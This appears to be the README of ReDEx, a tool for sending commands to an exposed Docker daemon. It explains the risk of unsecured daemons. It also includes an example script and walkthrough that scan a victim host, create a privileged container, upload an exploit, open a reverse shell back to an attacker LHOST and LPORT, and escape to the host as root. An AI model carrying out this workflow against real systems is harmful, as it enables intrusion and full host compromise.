# ReDEx - Remote Docker Execution Tool

> **WARNING**: EDUCATION PURPOSE ONLY

> **INFO**: Work In Progress

<video width="200" height="100" src="https://github.com/lmriccardo/redex/assets/32601287/3cf6e63a-5118-4697-b780-f845b709b9ae"></video>

**ReDEx** is tool that can remotely execute Docker commands via the Docker API on a remote host, which Docker Daemon has been exposed on (unsafe) TCP connections. Using actual HTTP (post, get, delete) requests it is possible to create, start, stop, inspect and list containers and images, and so on. However, all of these operations can also be used with malicious intent, in order to exploit the fact that the Daemon is exposed, creating privileged containers and performing so-called *Docker Breakout* techniques and *privilege escalation* on the host machine. 

Honestly, I am sceptical that some of these techniques works nowdays, at least I hope so. This tool is the result of my curiosity and some researches that I have done time ago, on my own. However, this tool is kindly fun, you should give it a try I think. 

*Thank you, and I wish you the best of Hack* !!!

## How much is secure Docker?

When it comes to security, Docker by itself is a safe place to run potentially vulnerable applications, given the fact that all containers are isolated from each others and from the host system. However, Docker is a powerfull tool, and it provides to the user the capability to do everything he want either being safe or not. For example, we can *share* any portion of the host filesystem with the container using volumes or bind mounts. This means that it is possible to mount the entire host filesystem on the container just running `docker run -v /:/path`. Now, inside the container it is possible to alter the mounted filesystem without any restriction, but in particular it bypasses the namespace isolation, leaking a lot of information that an attacker can use to carry out an attack. This is only one example of bad practice. Moreover, also starting container with root capabilities is not suggested. Assuming that a malicious entity has gained access to the container, he can easily install every tool he wants and perform malicious action against the host machine. 

Basically, Docker by itself is secure, however exposing the Docker Daemon both to unsafe connections and to untrusted users, leads to a lot of vulnerabilities being the principal vector for carrying out a lot Docker breakout attacks. If it is required that the Docker Daemon can communicate over a TCP protocols, at least one must be sure to setup a secured version either using the HTTPS encrypted docker, or by putting a secure web proxy in front of it.

## Kind of Scripting

Although ReDEx has been developed to be a CLI application, just like metasploit, there might be some repetead actions that can become boring, or some other that the user might forget to do, in order to correctly execute a *scan* or runs an exploit. For this reason, I decided to implement a simple "scripting" mechanism. It is not real scripting, it is just a way to put all the commands in a single file with extension `.rdx`, that can be loaded and ran into ReDEx. All the commands are executed sequentially, in the same order they appear into the file. In the following an example of a ReDEx command script.

```
% All the comments must go before the command call
set rhost=293.238.232.1
set lhost=232.231.43.12
set lport=4444
set name=breakout

% Scan the RHOST for open ports
scan

% Create a new container
create
lstconts

% Start the container and the attack
start
upload
execute
```

Then, inside the ReDEx CLI it is possible to run it using:

```
>>> : load scripts/script.rdx
>>> : run
>>> : stop
```

What this simple script does is very simple. First it sets some session variables, using the `set` command. In particular it sets the RHOST (remote host, or victim machine that is running Docker), the LHOST (local host IP address), LPORT (local port) and NAME (the name of the container that will be created). Then, it performs a scan to look for open ports in the RHOST, using the `scan` command. The next command, `create`, will create a fully-privileged container in the remote host named with the content of the variable `NAME` that we have previously configured. `lstconts` will just show all the running containers. Then, the `start` command will start the container and `upload` will upload the currently selected exploit into the remote container. Finally, the `execute` command will run, in this case, the *reverse shell handler* on the local host and the connection from the container. Once we have the CLI inside the container, it is possible to run the uploaded exploit and escape from the container, reaching the host system with root privileges.